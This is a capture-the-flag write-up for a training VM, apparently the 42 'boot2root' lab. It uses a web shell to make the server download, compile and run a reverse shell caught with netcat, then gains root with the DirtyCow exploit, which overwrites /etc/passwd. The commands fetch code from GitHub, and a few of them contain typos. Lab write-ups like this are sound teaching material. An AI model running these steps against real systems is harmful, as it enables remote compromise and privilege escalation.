# writeup 2

## Reverse shell

- Introduce our script in the server\
https://192.168.56.102/forum/templates_c/myfile.php?cmd=curl%20https://raw.githubusercontent.com/adbenoit-9/42_boot2root/main/scripts/reverse_shell.c%20--output%20reverseshell.c

- Compile it
```
$ curl https://192.168.56.102/forum/templates_c/myfile.php?cmd=gcc%20reverseshell.c%--output%20reverseshell.c
```
 - Launch netcat in the terminal
```
$ nc -vl 5432
```
- Execute the script\
https://192.168.56.102/forum/templates_c/myfile.php?cmd=./a.out

In terminal :
```
Listening on 0.0.0.0 5432
Connection received on e1r13p5.clusters.42paris.fr 55310
$ whoami
www-data
```

## Dirty cow

```
$ uname -r
3.2.0-91-generic-pae
```

valid exploit : `dirtycow` https://github.com/firefart/dirtycow/blob/master/dirty.c\
This program create a user with root privileges.

```
This exploit uses the pokemon exploit of the dirtycow vulnerability
// as a base and automatically generates a new passwd line.
// The user will be prompted for the new password when the binary is run.
// The original /etc/passwd file is then backed up to /tmp/passwd.bak
// and overwrites the root account with the generated line.
// After running the exploit you should be able to login with the newly
// created user.
```

```
$ cd /tmp
$ curl https://raw.githubusercontent.com/Gropopus/Boot2root/master/dirty.c --outpput dirty.c
$ gcc -pthread dirty.c -o dirty -lcrypt
gcc: error trying to exec 'cc1': execvp: No such file or directory
$ env
...
PWD=/tmp
...
$ export PATH=/usr/lib/lightdm/lightdm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
$ gcc -pthread dirty.c -o dirty -lcrypt
$ ./dirty
Please enter the new password: p
/etc/passwd successfully backed up to /tmp/passwd.bak
iciComplete line:
root:fil.mzz26AR.E:0:0:pwned:/root:/bin/bash

mmap: b7fd9000
ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'root' and the password 'p'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
/etc/passwd successfully backed up to /tmp/passwd.bak
iciComplete line:
root:fil.mzz26AR.E:0:0:pwned:/root:/bin/bash

mmap: b7fd9000
madvise 0

Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'root' and the password 'p'.

DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd

$ cat /etc/passwd
...
root:fil.mzz26AR.E:0:0:pwned:/root:/bin/bash
...
$ su root
su: must be run from a terminal
```
Connect with Laurie:\
*reminder password: 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4*

```
$ ssh laurie@192.168.56.102
$ su root
$ whoami
root
```
The end !
